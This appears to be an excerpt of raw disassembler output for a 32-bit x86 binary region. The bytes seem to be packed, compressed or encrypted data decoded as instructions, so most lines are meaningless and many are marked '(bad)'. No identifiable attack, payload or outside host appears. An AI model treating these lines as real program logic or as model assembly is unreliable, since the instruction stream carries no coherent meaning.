  42ad83:	scas   al,BYTE PTR es:[edi]
  42ad84:	stos   BYTE PTR es:[edi],al
  42ad85:	out    0x8c,eax
  42ad87:	sbb    BYTE PTR [esi],dl
  42ad89:	test   BYTE PTR [edx],ch
  42ad8b:	popa   
  42ad8c:	(bad)  
  42ad8d:	sub    BYTE PTR [ebx+0x19309cbe],al
  42ad93:	or     esp,esi
  42ad95:	xor    BYTE PTR [eax-0x599913ac],ch
  42ad9b:	push   0x44bd37af
  42ada0:	jns    0x42adcb
  42ada2:	fs call 0x3bb3:0x7d9b87c6
  42adaa:	jl     0x42adaf
  42adac:	fdiv   QWORD PTR [edx-0x67531c5f]
  42adb2:	in     eax,0xfd
  42adb4:	in     al,0x5f
  42adb6:	cmc    
  42adb7:	inc    ecx
  42adb8:	rcl    DWORD PTR [ebp+0x53],1
  42adbb:	push   ss
  42adbc:	dec    esp
  42adbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adbe:	out    dx,eax
  42adbf:	cmc    
  42adc0:	jae    0x42adcb
  42adc2:	sbb    cl,BYTE PTR [eax+0x3afe4f34]
  42adc8:	mov    bh,bl
  42adca:	push   esi
  42adcb:	(bad)  
  42adcd:	ins    DWORD PTR es:[edi],dx
  42adce:	or     DWORD PTR [edi-0x77fa61cb],ebp
  42add4:	and    al,0x5b
  42add6:	dec    ecx
  42add7:	bound  ecx,QWORD PTR [ebp+0x18]
  42adda:	daa    
  42addb:	or     al,0xd4
  42addd:	or     eax,0x44351dc7
  42ade2:	in     eax,dx
  42ade3:	(bad)  
  42ade4:	cmp    eax,0xa1529b4b
  42ade9:	aaa    
  42adea:	cmp    ebx,DWORD PTR [esi]
  42adec:	(bad)  
  42aded:	cmp    al,0x90
  42adef:	xor    DWORD PTR [edx],eax
  42adf1:	ins    DWORD PTR es:[edi],dx
  42adf2:	clc    
  42adf3:	arpl   WORD PTR [ebp-0x2622a487],dx
  42adf9:	mov    dh,0x63
  42adfb:	jbe    0x42ae36
  42adfd:	sti    
  42adfe:	push   eax
  42adff:	adc    DWORD PTR [ecx],0xffffffe8
  42ae02:	xor    DWORD PTR [ecx-0x4e],0x72837fc
  42ae09:	xlat   BYTE PTR ds:[ebx]
  42ae0a:	pusha  
  42ae0b:	repnz pop ebp
  42ae0d:	fucomp st(2)
  42ae0f:	pop    ecx
  42ae10:	in     eax,0x0
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    edx,0xa539afb5
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0xa0000001
  42ae8d:	call   0x94695fb6
  42ae92:	push   eax
  42ae93:	(bad)  
  42ae94:	pop    ss
  42ae95:	fst    DWORD PTR [edi+0x7c]
  42ae98:	sub    eax,DWORD PTR [ecx+0x4b4f7c39]
  42ae9e:	js     0x42aeec
  42aea0:	sub    DWORD PTR [ecx],0xffffffb3
  42aea3:	retf   0x28bc
  42aea6:	aas    
  42aea7:	cwde   
  42aea8:	push   esi
  42aea9:	xor    eax,DWORD PTR [ecx+0x68]
  42aeac:	ja     0x42af12
  42aeae:	mov    dh,0x9
  42aeb0:	xchg   edx,eax
  42aeb1:	outs   dx,BYTE PTR ds:[esi]
  42aeb2:	(bad)  
  42aeb3:	outs   dx,DWORD PTR ds:[esi]
  42aeb4:	lds    edx,FWORD PTR [ebx+ebp*2]
  42aeb7:	mov    ecx,0x54915603
  42aebc:	sbb    al,0x8b
  42aebe:	(bad)  
  42aebf:	mov    WORD PTR [ecx],ss
  42aec1:	lock sub ebp,DWORD PTR [edi]
  42aec4:	out    0x95,al
  42aec6:	pop    ds
  42aec7:	mov    BYTE PTR [eax],dl
  42aec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aeca:	loope  0x42aeff
  42aecc:	stc    
  42aecd:	pcmpeqd mm4,QWORD PTR [ecx+0x49]
  42aed1:	into   
  42aed2:	daa    
  42aed3:	clc    
  42aed4:	dec    ebp
  42aed5:	mov    dl,0x68
  42aed7:	aaa    
  42aed8:	rcl    BYTE PTR [ebp+0x1b5a8749],1
  42aede:	arpl   WORD PTR [ebx-0x64e775f7],bx
  42aee4:	ja     0x42aeba
  42aee6:	pop    ebx
  42aee7:	cmp    BYTE PTR [ebp+esi*4-0x79e15fb8],bl
  42aeee:	in     eax,0x22
  42aef0:	or     ch,dl
  42aef2:	imul   esp,esp,0x75f9c0a
  42aef8:	or     al,0xfd
  42aefa:	push   0x1a6c47a7
  42aeff:	push   ebp
  42af00:	stos   DWORD PTR es:[edi],eax
  42af01:	icebp  
  42af02:	or     eax,0x1257bbe0
  42af07:	aad    0x47
  42af09:	sbb    ecx,DWORD PTR [ebx]
  42af0b:	scas   eax,DWORD PTR es:[edi]
  42af0c:	shl    DWORD PTR [edi-0x5],0xd5
  42af10:	mov    ah,0x69
  42af12:	(bad)  
  42af13:	or     bh,BYTE PTR [edx-0x2b7f0528]
  42af19:	inc    esi
  42af1a:	pop    ebx
  42af1b:	mov    al,ds:0xd501698b
  42af20:	rcl    BYTE PTR [eax+0x6],0x43
  42af24:	xchg   edi,eax
  42af25:	push   cs
  42af26:	ret    
  42af27:	test   eax,0xba92c7e0
  42af2c:	jl     0x42af7f
  42af2e:	js     0x42aef3
  42af30:	sbb    eax,0xf86f281f
  42af35:	imul   edi,ecx,0xffffff91
  42af38:	retf   
  42af39:	mov    ecx,0xd4c33009
  42af3e:	std    
  42af3f:	shr    DWORD PTR [ecx+0x44419042],cl
  42af45:	mov    ds:0x162b37a7,al
  42af4a:	sub    al,BYTE PTR [ecx]
  42af4c:	mov    ss,WORD PTR [ecx-0x6057f5ce]
  42af52:	dec    eax
  42af53:	ret    
  42af54:	add    al,0xf2
  42af56:	fs int3 
  42af58:	outs   dx,BYTE PTR ds:[esi]
  42af59:	cmp    esi,edi
  42af5b:	fxam   
  42af5d:	inc    eax
  42af5e:	icebp  
  42af5f:	in     eax,dx
  42af60:	in     al,dx
  42af61:	fisubr DWORD PTR [edi-0x11]
  42af64:	outs   dx,DWORD PTR ds:[esi]
  42af65:	add    al,0xf3
  42af67:	sahf   
  42af68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af69:	mov    edx,0xbb14db2b
  42af6e:	lahf   
  42af6f:	call   DWORD PTR [esi-0x88ba77b]
  42af75:	jae    0x42afe2
  42af77:	adc    DWORD PTR [esi+0x82eba56],esi
  42af7d:	mov    esp,ss
  42af7f:	mov    ds:0x367162c5,eax
  42af84:	in     eax,dx
  42af85:	mov    edi,ds
  42af87:	jns    0x42afc6
  42af89:	fidivr DWORD PTR [edx-0x69]
  42af8c:	popa   
  42af8d:	fcom   DWORD PTR fs:[ebp+0x3]
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	inc    esp
  42b001:	dec    edx
  42b002:	xlat   BYTE PTR ds:[ebx]
  42b003:	mov    ch,BYTE PTR [edx+0x50001cc]
  42b009:	add    DWORD PTR [eax],eax
  42b00b:	add    BYTE PTR [ecx-0x61b54707],bl
  42b011:	or     edi,DWORD PTR cs:[eax+0x4b48a628]
  42b018:	add    esi,DWORD PTR [ecx+0x45]
  42b01b:	sar    DWORD PTR [eax-0x1944320f],1
  42b021:	je     0x42b095
  42b023:	es inc esi
  42b025:	out    dx,al
  42b026:	bound  ebx,QWORD PTR [esi-0x5]
  42b029:	xor    DWORD PTR [edi],edi
  42b02b:	fcom   QWORD PTR [esi-0x6bac751c]
  42b031:	stos   BYTE PTR es:[edi],al
  42b032:	jmp    DWORD PTR [eax-0x3d]
  42b035:	sti    
  42b036:	cmp    ah,BYTE PTR [ecx+0x5d]
  42b039:	push   ecx
  42b03a:	daa    
  42b03b:	frstor [edx-0x676f7922]
  42b041:	cmp    DWORD PTR [ecx],esp
  42b043:	pushf  
  42b044:	mov    ecx,0xc689c7a2
  42b049:	inc    eax
  42b04a:	es sahf 
  42b04c:	or     BYTE PTR [ecx-0x17c2d751],ch
  42b052:	loope  0x42b00a
  42b054:	or     DWORD PTR [edi-0x2fadb03c],edx
  42b05a:	daa    
  42b05b:	dec    ebp
  42b05c:	out    0x8c,eax
  42b05e:	or     ax,0x56d7
  42b062:	not    DWORD PTR [ebp-0x875bc14]
  42b068:	pand   mm2,QWORD PTR [edi-0x36c87342]
  42b06f:	gs sub al,0x1
  42b072:	test   eax,0x36dcb33d
  42b077:	ds mov cl,0xc8
  42b07a:	ins    BYTE PTR es:[edi],dx
  42b07b:	retf   0xee59
  42b07e:	jg     0x42b0aa
  42b080:	or     DWORD PTR [ebx],0x7534b500
  42b086:	xchg   edx,eax
  42b087:	mov    al,ds:0xff6e810d
  42b08c:	adc    BYTE PTR [esi+0x52dcbc82],ch
  42b092:	icebp  
  42b093:	inc    ebx
  42b094:	cmp    edx,ebx
  42b096:	push   es
  42b097:	fbstp  TBYTE PTR [edx]
  42b099:	pop    es
  42b09a:	push   ss
  42b09b:	cmp    al,0x57
  42b09d:	sub    eax,0xc8bfccc1
  42b0a2:	retf   0x6875
  42b0a5:	sub    DWORD PTR [ebp+ebp*4-0x4387265c],edi
  42b0ac:	inc    esi
  42b0ad:	(bad)  
  42b0ae:	popa   
  42b0af:	pop    ebx
  42b0b0:	dec    eax
  42b0b1:	jbe    0x42b0f6
  42b0b3:	or     eax,0xcd977ee
  42b0b8:	sub    bh,BYTE PTR [edi-0x48]
  42b0bb:	fnsave [ebp+0x6f109a04]
  42b0c1:	mov    eax,0xb5e55711
  42b0c6:	inc    eax
  42b0c7:	icebp  
  42b0c8:	mov    cl,0x86
  42b0ca:	mov    esi,0x43ffddab
  42b0cf:	mov    dh,0xb0
  42b0d1:	in     al,dx
  42b0d2:	push   ebx
  42b0d3:	jbe    0x42b05b
  42b0d5:	cmp    eax,0xaa3afad
  42b0da:	ins    DWORD PTR es:[edi],dx
  42b0db:	hlt    
  42b0dc:	in     al,dx
  42b0dd:	sub    DWORD PTR [edx],edx
  42b0df:	cwde   
  42b0e0:	sub    al,BYTE PTR [ebx]
  42b0e2:	outs   dx,DWORD PTR ds:[esi]
  42b0e3:	int3   
  42b0e4:	cmp    dh,BYTE PTR [edx]
  42b0e6:	sub    BYTE PTR [esi],dl
  42b0e8:	fs shl BYTE PTR gs:[esi],cl
  42b0ec:	std    
  42b0ed:	test   eax,0x45ad8bce
  42b0f2:	pop    ds
  42b0f3:	popf   
  42b0f4:	loope  0x42b149
  42b0f6:	pop    ss
  42b0f7:	push   edi
  42b0f8:	retf   0x384e
  42b0fb:	out    dx,eax
  42b0fc:	jae    0x42b0ea
  42b0fe:	pop    ecx
  42b0ff:	sbb    ebx,edi
  42b101:	test   al,0xc0
  42b103:	outs   dx,DWORD PTR ds:[esi]
  42b104:	jl     0x42b090
  42b106:	adc    edx,edi
  42b108:	xchg   ecx,eax
  42b109:	push   esi
  42b10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b10b:	add    eax,0xdb3a2f34
  42b110:	and    eax,DWORD PTR [eax]
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	xchg   edx,eax
  42b181:	iret   
  42b182:	push   ecx
  42b183:	mov    bh,0xaf
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0x88000001,al
  42b18d:	out    dx,al
  42b18e:	pop    eax
  42b18f:	pop    edx
  42b190:	jae    0x42b1ce
  42b192:	sbb    ah,BYTE PTR [eax+0x7c7ec12]
  42b198:	loope  0x42b1aa
  42b19a:	ja     0x42b1c3
  42b19c:	jle    0x42b16f
  42b19e:	pop    ebp
  42b19f:	loop   0x42b1fc
  42b1a1:	xchg   BYTE PTR [ecx+0x6],cl
  42b1a4:	fsin   
  42b1a6:	outs   dx,DWORD PTR ds:[esi]
  42b1a7:	out    dx,al
  42b1a8:	adc    ah,BYTE PTR [edi]
  42b1aa:	(bad)  
  42b1ab:	iret   
  42b1ac:	je     0x42b19d
  42b1ae:	pop    esi
  42b1af:	out    dx,eax
  42b1b0:	jbe    0x42b13a
  42b1b2:	xchg   ecx,esi
  42b1b4:	add    cl,BYTE PTR ds:0xbeff8954
  42b1ba:	jge    0x42b151
  42b1bc:	push   es
  42b1bd:	iret   
  42b1be:	icebp  
  42b1bf:	push   eax
  42b1c0:	adc    eax,edi
  42b1c2:	pop    esi
  42b1c3:	ins    DWORD PTR es:[edi],dx
  42b1c4:	mov    ds:0xa2c3d14a,al
  42b1c9:	lds    eax,FWORD PTR [eax]
  42b1cb:	jl     0x42b1f5
  42b1cd:	xlat   BYTE PTR ds:[ebx]
  42b1ce:	adc    dl,BYTE PTR [ebx]
  42b1d0:	push   edi
  42b1d1:	xchg   esp,eax
  42b1d2:	pop    esi
  42b1d4:	(bad)  
  42b1d5:	fwait
  42b1d6:	pop    ds
  42b1d7:	inc    eax
  42b1d8:	push   ebp
  42b1d9:	repnz mov eax,ds:0x2bd2310e
  42b1df:	sbb    BYTE PTR [ebx-0x10],0xb8
  42b1e3:	jne    0x42b1d9
  42b1e5:	cs enter 0x8ddc,0xaa
  42b1ea:	and    DWORD PTR [esi],ebx
  42b1ec:	jmp    0x42b1e3
  42b1ee:	ss xchg esi,eax
  42b1f0:	jg     0x42b243
  42b1f2:	inc    ebp
  42b1f3:	int3   
  42b1f4:	pop    ecx
  42b1f5:	dec    esi
  42b1f6:	fiadd  WORD PTR [eax-0x5b]
  42b1f9:	les    ebp,FWORD PTR [esi+ebx*2-0x25]
  42b1fd:	scas   al,BYTE PTR es:[edi]
  42b1fe:	jo     0x42b201
  42b200:	inc    ecx
  42b201:	xor    dh,cl
  42b203:	cmp    ebp,ebx
  42b205:	pop    edi
  42b206:	ror    ch,1
  42b208:	dec    eax
  42b209:	mov    es:0xc3022912,eax
  42b20f:	inc    eax
  42b210:	pop    edi
  42b211:	fld    TBYTE PTR [edx]
  42b213:	push   0xffffffe1
  42b215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b216:	pop    esi
  42b217:	pusha  
  42b218:	pop    ecx
  42b219:	and    al,0xcf
  42b21b:	stos   BYTE PTR es:[edi],al
  42b21c:	inc    ebx
  42b21d:	pop    edi
  42b21e:	pop    esp
  42b21f:	(bad)  
  42b220:	fisub  WORD PTR [ebx-0x5f]
  42b223:	inc    edi
  42b224:	mov    ah,0x82
  42b226:	inc    eax
  42b227:	sbb    esp,DWORD PTR [ebx+0x13]
  42b22a:	xor    bh,dh
  42b22c:	mov    edi,0xfb9f3bb3
  42b231:	jmp    0xbbd04
  42b236:	adc    esp,esp
  42b238:	loop   0x42b231
  42b23a:	dec    ebp
  42b23b:	out    0xbd,eax
  42b23d:	xchg   DWORD PTR [edx+0x44],edx
  42b240:	div    DWORD PTR [esi-0x5006fb12]
  42b246:	aaa    
  42b247:	nop
  42b248:	out    0x48,eax
  42b24a:	push   esp
  42b24b:	test   eax,0xb01ccafb
  42b250:	out    dx,al
  42b251:	mov    cl,0x7c
  42b253:	cmp    DWORD PTR [bx+di],ebp
  42b256:	dec    edx
  42b257:	push   0x69
  42b259:	sbb    ebp,DWORD PTR [ebp-0xe82c313]
  42b25f:	rcl    dl,1
  42b261:	fimul  DWORD PTR [eax+0x1cb7b95c]
  42b267:	adc    BYTE PTR [edi-0x3a1f6f5a],0xa
  42b26e:	ret    0x4360
  42b271:	in     eax,dx
  42b272:	ret    
  42b273:	add    esp,DWORD PTR [esi+esi*8+0x1f6afc31]
  42b27a:	(bad)  
  42b27b:	push   esp
  42b27c:	fisubr WORD PTR [ecx]
  42b27e:	and    bh,BYTE PTR ds:0xbdc80471
  42b284:	clc    
  42b285:	bound  esi,QWORD PTR ds:0x8520a1f7
  42b28b:	xor    al,0xe7
  42b28d:	dec    ebp
  42b28e:	pop    es
  42b28f:	outs   dx,BYTE PTR ds:[esi]
  42b290:	jb     0x42b292
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x83738e65
  42b301:	push   ebp
  42b302:	gs pop esp
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x5b000001
  42b30d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b30e:	push   0xc56db303
  42b313:	sbb    ecx,DWORD PTR [edx+ebp*1-0x7c]
  42b317:	cmp    eax,0x71790da4
  42b31c:	(bad)  
  42b31d:	in     eax,dx
  42b31e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b31f:	retf   0xe551
  42b322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b323:	rcl    BYTE PTR [ebx+esi*8],0x52
  42b327:	int3   
  42b328:	mov    ebp,0x8074205c
  42b32d:	loopne 0x42b351
  42b32f:	xchg   DWORD PTR [ebp+0x17],esp
  42b332:	mov    bl,0x6c
  42b334:	xchg   edx,eax
  42b335:	and    BYTE PTR [eax+ebx*8-0x61],cl
  42b339:	test   BYTE PTR [ebp-0x4d],0x39
  42b33d:	cmc    
  42b33e:	pop    edi
  42b33f:	mov    bl,0x8d
  42b341:	mov    ecx,0x532b9500
  42b346:	xlat   BYTE PTR ds:[ebx]
  42b347:	xor    bh,BYTE PTR [ebp-0x20caf886]
  42b34d:	fst    QWORD PTR fs:[eax-0x4c]
  42b351:	mov    ds:0x7ce42871,eax
  42b356:	or     DWORD PTR [eax+0x54],0x23
  42b35a:	ins    BYTE PTR es:[edi],dx
  42b35b:	std    
  42b35c:	inc    ecx
  42b35d:	cmc    
  42b35e:	or     al,0x40
  42b360:	add    esp,DWORD PTR [eax-0x20]
  42b363:	in     al,dx
  42b364:	shr    BYTE PTR ds:0x1a38c666,1
  42b36a:	repz mov bl,0x5
  42b36d:	(bad)  
  42b36e:	aad    0x91
  42b370:	ins    BYTE PTR es:[edi],dx
  42b371:	adc    BYTE PTR [eax+0x7e0e024e],0xe8
  42b378:	xchg   esi,eax
  42b379:	lods   al,BYTE PTR ds:[esi]
  42b37a:	(bad)  
  42b37b:	jae    0x42b3db
  42b37d:	cwde   
  42b37e:	adc    al,0x11
  42b380:	(bad)
  42b383:	adc    edi,DWORD PTR [ebx]
  42b385:	test   al,0x43
  42b387:	and    ebx,DWORD PTR [edi]
  42b389:	rol    BYTE PTR [esi+edi*2],0x3b
  42b38d:	test   DWORD PTR [edi-0x60a0d4e5],0x4a6894dc
  42b397:	sbb    al,BYTE PTR [ebp-0x53]
  42b39a:	jns    0x42b398
  42b39c:	add    DWORD PTR [esi],edx
  42b39e:	xor    eax,0xa74ff00
  42b3a3:	or     al,0x7b
  42b3a5:	dec    ebx
  42b3a6:	int3   
  42b3a7:	imul   esp,DWORD PTR [ebx-0x30c6b3ef],0xa8a52b88
  42b3b1:	imul   eax,DWORD PTR [eax],0x1
  42b3b4:	xchg   ecx,eax
  42b3b5:	sbb    ah,BYTE PTR [edi+0x66]
  42b3b8:	(bad)
  42b3bb:	popa   
  42b3bc:	push   0x1d
  42b3be:	sbb    dl,ch
  42b3c0:	jne    0x42b407
  42b3c2:	inc    esp
  42b3c3:	pop    ebx
  42b3c4:	shl    DWORD PTR [esi],0x35
  42b3c7:	(bad)  
  42b3c8:	pusha  
  42b3c9:	sub    al,BYTE PTR [esi+0x40]
  42b3cc:	inc    esi
  42b3cd:	add    ebp,DWORD PTR ds:0xe9a0f32
  42b3d3:	mov    bh,0xeb
  42b3d5:	call   DWORD PTR [edx+ecx*8+0x46084716]
  42b3dc:	je     0x42b3ad
  42b3de:	popa   
  42b3df:	sti    
  42b3e0:	adc    BYTE PTR [edi+0x2e1b1346],0xec
  42b3e7:	cs jle 0x42b405
  42b3ea:	outs   dx,BYTE PTR ds:[esi]
  42b3eb:	rol    BYTE PTR [ebx-0x63],0x57
  42b3ef:	adc    BYTE PTR [esi+0x53],cl
  42b3f2:	inc    ebp
  42b3f3:	xchg   BYTE PTR ds:0x667b,bl
  42b3f8:	push   0x73
  42b3fa:	push   esi
  42b3fb:	pop    ecx
  42b3fc:	int3   
  42b3fd:	mov    ecx,0x94d6db9b
  42b402:	les    edi,FWORD PTR [edx+0x636c9bde]
  42b408:	sbb    BYTE PTR [ebx-0x575c3863],ah
  42b40e:	sub    BYTE PTR [edi-0x49],dh
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edx+ecx*8],ebp
  42b482:	ds je  0x42b43e
  42b485:	iret   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x5b000001
  42b48d:	push   edi
  42b48e:	(bad)  
  42b48f:	cli    
  42b490:	push   ebx
  42b491:	push   cs
  42b492:	fdivr  DWORD PTR [esi-0x48]
  42b495:	add    bh,BYTE PTR [eax+0x37]
  42b498:	pop    edi
  42b499:	icebp  
  42b49a:	mov    BYTE PTR [edx+0x5b12f80d],dh
  42b4a0:	xor    al,BYTE PTR [ebp-0x20]
  42b4a3:	arpl   bp,cx
  42b4a5:	adc    BYTE PTR [esi+0x6cbcdc79],0x66
  42b4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4ad:	xor    bh,BYTE PTR fs:[ecx+0x137209d2]
  42b4b4:	dec    edi
  42b4b5:	les    ecx,FWORD PTR [esi]
  42b4b7:	push   eax
  42b4b8:	loop   0x42b457
  42b4ba:	inc    ebx
  42b4bb:	test   al,0x9
  42b4bd:	pusha  
  42b4be:	dec    ebx
  42b4bf:	mov    al,ds:0x3c2e2543
  42b4c4:	push   ds
  42b4c5:	inc    esp
  42b4c6:	(bad)  
  42b4c8:	pushf  
  42b4c9:	sub    esp,0x7f99db4
  42b4cf:	sub    BYTE PTR [ebp+0x3a],0x57
  42b4d3:	cs cmp eax,0x4bd50edf
  42b4d9:	xchg   ebx,eax
  42b4da:	(bad)  
  42b4db:	adc    eax,0xe7b4da90
  42b4e0:	xchg   ecx,eax
  42b4e1:	pop    eax
  42b4e2:	loopne 0x42b4cb
  42b4e4:	xchg   edi,eax
  42b4e5:	inc    esp
  42b4e6:	dec    ebx
  42b4e7:	aas    
  42b4e8:	int3   
  42b4e9:	pop    edx
  42b4ea:	jbe    0x42b567
  42b4ec:	aam    0xc7
  42b4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4ef:	int3   
  42b4f0:	or     al,bl
  42b4f2:	ins    BYTE PTR es:[edi],dx
  42b4f3:	mov    edi,DWORD PTR [ecx+eiz*4-0x135cdbd6]
  42b4fa:	sub    esi,ebx
  42b4fc:	repnz mov esi,edx
  42b4ff:	or     DWORD PTR [ebx-0x7cb6035d],esi
  42b505:	pop    es
  42b506:	shl    ecx,cl
  42b508:	call   DWORD PTR ds:0x33b831cf
  42b50e:	push   ebx
  42b50f:	jae    0x42b491
  42b511:	pop    esi
  42b512:	push   edi
  42b513:	ret    0x89d4
  42b516:	retf   
  42b517:	cmp    DWORD PTR [esi],esi
  42b519:	mov    edi,0xabcb2b5e
  42b51e:	fmul   QWORD PTR [esi]
  42b520:	jns    0x42b575
  42b522:	dec    BYTE PTR [eax]
  42b524:	or     eax,0x4c1f503e
  42b529:	jns    0x42b521
  42b52b:	dec    ebx
  42b52c:	outs   dx,BYTE PTR ds:[esi]
  42b52d:	xchg   esi,eax
  42b52e:	rcl    DWORD PTR [esi],cl
  42b530:	fisttp QWORD PTR [edx]
  42b532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b533:	das    
  42b534:	sti    
  42b535:	repnz mov bl,0xc5
  42b538:	pop    edi
  42b539:	popa   
  42b53a:	sahf   
  42b53b:	mov    WORD PTR [ecx+0x180ae678],fs
  42b541:	dec    ebp
  42b542:	push   cs
  42b543:	fisttp WORD PTR ds:[esi]
  42b546:	rol    BYTE PTR [ecx+0x7add90e9],0xae
  42b54d:	leave  
  42b54e:	sub    bl,BYTE PTR [edi+0x79]
  42b551:	test   al,0x3d
  42b553:	lods   al,BYTE PTR ds:[esi]
  42b554:	int3   
  42b555:	test   eax,0x47e9ba98
  42b55a:	imul   ecx,DWORD PTR [esi-0x27],0x6a
  42b55e:	or     esp,edx
  42b560:	push   es
  42b561:	lock repz fsubr QWORD PTR [ebx]
  42b565:	dec    esi
  42b566:	addr16 dec ecx
  42b568:	cwde   
  42b569:	leave  
  42b56a:	dec    edi
  42b56b:	jl     0x42b562
  42b56d:	inc    ebx
  42b56e:	jmp    0x42b58d
  42b570:	sbb    dh,BYTE PTR [ecx+0x61]
  42b573:	sub    cl,BYTE PTR [ecx-0x20b50c80]
  42b579:	xchg   ecx,eax
  42b57a:	ret    
  42b57b:	mov    bh,0xa0
  42b57d:	popa   
  42b57e:	xor    DWORD PTR fs:[ecx],esp
  42b581:	push   ss
  42b582:	idiv   DWORD PTR ds:0xe230d98b
  42b588:	pop    esp
  42b589:	jno    0x42b587
  42b58b:	pop    edx
  42b58c:	push   0xffffff86
  42b58e:	scas   eax,DWORD PTR es:[edi]
  42b58f:	sub    dh,BYTE PTR [ecx+0x0]
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	loope  0x42b5e8
  42b602:	(bad)  
  42b603:	mov    edi,0x1d0be
  42b608:	add    eax,0x38000001
  42b60d:	loopne 0x42b5f7
  42b60f:	retf   0xe8a5
  42b612:	repnz mov ecx,0x3d3ef129
  42b618:	jle    0x42b5f8
  42b61a:	fwait
  42b61b:	add    al,0x64
  42b61d:	jg     0x42b637
  42b61f:	imul   ecx,DWORD PTR [ecx+0x69658ad],0xffffffff
  42b626:	xchg   ecx,eax
  42b627:	push   esi
  42b628:	lds    ecx,FWORD PTR [esi+0x21dce9c6]
  42b62e:	stos   BYTE PTR es:[edi],al
  42b62f:	pop    ecx
  42b630:	adc    DWORD PTR [esi+edi*1-0xf12710b],ebx
  42b637:	xchg   ebx,eax
  42b638:	in     eax,dx
  42b639:	xchg   esi,eax
  42b63a:	sub    eax,DWORD PTR [esi+0x32]
  42b63d:	push   edx
  42b63e:	stos   DWORD PTR es:[edi],eax
  42b63f:	xchg   edi,eax
  42b640:	or     DWORD PTR [ebx-0x46e3cac0],ecx
  42b646:	repz adc eax,0x3e3e1d46
  42b64c:	sbb    eax,0x16d7e9d2
  42b651:	cmp    al,0x15
  42b653:	push   0x54
  42b655:	jno    0x42b637
  42b657:	shld   DWORD PTR fs:[esi],edi,cl
  42b65b:	sbb    DWORD PTR [ebp-0x7a0bdba1],0xffffffb9
  42b662:	data16 outs dx,BYTE PTR ds:[esi]
  42b664:	lock fcmovb st,st(6)
  42b667:	lods   eax,DWORD PTR ds:[esi]
  42b668:	xchg   ebx,eax
  42b669:	fisttp QWORD PTR [edx-0x23]
  42b66c:	xor    ebx,DWORD PTR ds:0xbe8bf3a0
  42b672:	das    
  42b673:	mov    ecx,0x1e1fbc06
  42b678:	cmp    DWORD PTR [eax+0x4b9a166d],ecx
  42b67e:	push   esi
  42b67f:	loop   0x42b69a
  42b681:	or     BYTE PTR [edi-0x8],ch
  42b684:	pop    edi
  42b685:	cli    
  42b686:	iret   
  42b687:	stos   DWORD PTR es:[edi],eax
  42b688:	and    BYTE PTR [ecx+0x21],ch
  42b68b:	mov    ds,esi
  42b68d:	push   ds
  42b68e:	mov    edx,?
  42b690:	cmp    ch,BYTE PTR [eax-0x408fcc79]
  42b696:	pop    esi
  42b697:	xor    DWORD PTR [edx-0x4a],eax
  42b69a:	pop    esp
  42b69b:	je     0x42b6cf
  42b69d:	xor    bh,0x2f
  42b6a0:	mov    cl,0xa3
  42b6a2:	sub    DWORD PTR ds:0xe9ebc511,eax
  42b6a8:	dec    ecx
  42b6a9:	aas    
  42b6aa:	adc    cl,ah
  42b6ac:	repnz mov al,BYTE PTR [ebx+ebp*4+0x1de238d2]
  42b6b4:	pop    edx
  42b6b5:	sbb    DWORD PTR [esi+0x5ee7a5b5],0x4a
  42b6bc:	push   ebp
  42b6bd:	xor    eax,0x532afd08
  42b6c2:	xor    dh,BYTE PTR [eax]
  42b6c4:	sbb    al,0x4f
  42b6c6:	sub    edx,ecx
  42b6c8:	mov    eax,ds:0x2d5f89bd
  42b6cd:	mov    bl,0xcc
  42b6cf:	sub    eax,0xf7785b7c
  42b6d4:	ret    
  42b6d5:	imul   edx,DWORD PTR [edi+0x33e69d18],0x35ee3057
  42b6df:	xchg   esi,eax
  42b6e0:	lock jbe 0x42b6e9
  42b6e3:	lods   al,BYTE PTR ds:[esi]
  42b6e4:	outs   dx,BYTE PTR ds:[esi]
  42b6e5:	xor    cl,BYTE PTR [edi*4-0x42c30bf2]
  42b6ec:	ja     0x42b717
  42b6ee:	dec    edi
  42b6ef:	in     al,0x90
  42b6f1:	test   al,0x2f
  42b6f3:	mov    ch,BYTE PTR ds:0x1ede37da
  42b6f9:	leave  
  42b6fa:	mov    es,WORD PTR [ecx-0x1789fb37]
  42b700:	div    BYTE PTR [eax-0x7830d355]
